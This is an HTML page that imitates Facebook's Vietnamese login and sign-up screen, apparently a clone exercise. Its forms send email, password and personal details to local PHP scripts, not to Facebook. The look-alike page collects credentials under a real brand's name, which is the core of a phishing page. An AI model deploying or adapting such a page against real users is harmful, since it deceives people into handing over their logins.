<!DOCTYPE html>
<html>
<head >
	<script type="text/javascript" src="fb.js"></script>
	<link rel="stylesheet" type="text/css" href="styles.css">
	<meta charset="utf-8">
	<title>Facebook</title>
</head>
<body>
<div id="total">
<form action="facebook/login.php" method="POST">
	<table id="one"style="border-spacing: 0">
		<tr>
			<td rowspan="3" id="facebook">facebook</td>
			<td width="12%"><sup style="color: white">Email hoặc điện thoại</sup></td>
			<td width="12%"><sup style="color: white">Mật khẩu</sup></td>
		</tr>
		<tr>
			<td rowspan="2" style="vertical-align:top;padding-top: 3px;"><input id="user" type="text" name="email" width="10" required></td>
			<td><input id="pass" type="password" name="pass" width="10" required></td>
			<td><input type="submit" value="Đăng nhập" id="txtlogin"></td>
		</tr>
		<tr>
			<td><sub style="color: #afbdd4;font-size: 13px">Quên tài khoản?</sub><td>
		</tr>
	</table>
</form>
<form action="facebook/register.php" method="POST">
	<div style="background-color: #eeeff4">
	<table >
		<tr>
			<td width="55%" rowspan="2" id="two">Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</td>
			<td ><b style="font-size: 40px">Đăng ký<b></td>
		</tr>
		<tr>
			<td style="font-size: 20px">Luôn miễn phí.</td>
		</tr>
		<tr>
			<td id="three" rowspan="9"><img src="anh.png" ></td>
		</tr>
		<tr>
			<td ><input type="text" name="firstname" placeholder="Họ" id="st1" required /></td>
			<td><input type="text" name="lastname" placeholder="Tên" id="st2" required /></td>
		</tr>
		<tr>
			<td colspan="4"><input  type="text" name="username" placeholder="Số di động hoặc email" class="st3" id="contact" required></td>
		</tr>
		<tr>
			<td colspan="4"><input type="password" name="password" placeholder="Mật khẩu mới"class="st3" required ></td>
		</tr>
		<tr><td style="font-size: 20px;padding-top: 15px;">Ngày sinh</td></tr>
	</table>
	<div>
		<select name="day" id="day" >
			<option value="ngày" selected>Ngày</option>
			<option value="1">1</option>
			<option value="2">2</option>
			<option value="3">3</option>
			<option value="4">4</option>
			<option value="5">5</option>
			<option value="6">6</option>
			<option value="7">7</option>
			<option value="8">8</option>
			<option value="9">9</option>
			<option value="10">10</option>
			<option value="11">11</option>
			<option value="12">12</option>
			<option value="13">13</option>
			<option value="14">14</option>
			<option value="15">15</option>
			<option value="16">16</option>
			<option value="17">17</option>
			<option value="18">18</option>
			<option value="19">19</option>
			<option value="20">20</option>
			<option value="21">21</option>
			<option value="22">22</option>
			<option value="23">23</option>
			<option value="24">24</option>
			<option value="25">25</option>
			<option value="26">26</option>
			<option value="27">27</option>
			<option value="28">28</option>
			<option value="29">29</option>
			<option value="30">30</option>
			<option value="31">31</option>
		</select>
	</div>
	<div style="margin-top: -30px;">	
		<select name="month" id="month" >
			<option value="tháng" selected>Tháng</option>
			<option value="tháng 1">Tháng 1</option>
			<option value="tháng 2">Tháng 2</option>
			<option value="tháng 3">Tháng 3</option>
			<option value="tháng 4">Tháng 4</option>
			<option value="tháng 5">Tháng 5</option>
			<option value="tháng 6">Tháng 6</option>
			<option value="tháng 7">Tháng 7</option>
			<option value="tháng 8">Tháng 8</option>
			<option value="tháng 9">Tháng 9</option>
			<option value="tháng 10">Tháng 10</option>
			<option value="tháng 11">Tháng 11</option>
			<option value="tháng 12">Tháng 12</option>
		</select>
	</div>
	<div style="margin-top: -30px">
		<select name="year" id="year">
			<option value="năm" selected>Năm</option>
			<option value="2018">2018</option>
			<option value="2017">2017</option>
			<option value="2016">2016</option>
			<option value="2015">2015</option>
			<option value="2014">2014</option>
			<option value="2013">2013</option>
			<option value="2012">2012</option>
			<option value="2011">2011</option>
			<option value="2010">2010</option>
			<option value="2009">2009</option>
			<option value="2008">2008</option>
			<option value="2007">2007</option>
			<option value="2006">2006</option>
			<option value="2005">2005</option>
			<option value="2004">2004</option>
			<option value="2003">2003</option>
			<option value="2002">2002</option>
			<option value="2001">2001</option>
			<option value="2000">2000</option>
		</select>
	</div>
	<small style="float: right;margin-left: 1090px;margin-right: 340px;margin-top: -30px;"><abbr style="color:#002699">Tại sao tôi cần cung cấp ngày sinh của mình?</abbr></small>
	<div id="sel">
		<input type="radio" name="gender" value="Nữ" required>
		<label>Nữ</label>
		<input type="radio" name="gender" value="Nam" required>
		<label>Nam</label>
	</div>
	<small style="float: right;margin-left: 880px;margin-right: 380px;">Bằng cách nhấp vào Đăng ký, bạn đồng ý với <abbr style="color:#002699">Điều khoản</abbr>, <abbr style="color:#002699">Chính sách dữ liệu</abbr> và <abbr style="color:#002699">Chính sách cookie</abbr> của chúng tôi. Bạn có thể nhận được thông báo của chúng tôi qua SMS và hủy nhận bất kỳ lúc nào.</small>
	<input type="submit" name="submit" value="Đăng ký" id="submit" onclick=" return signup();">
</form>
</div>
</body>
</html>
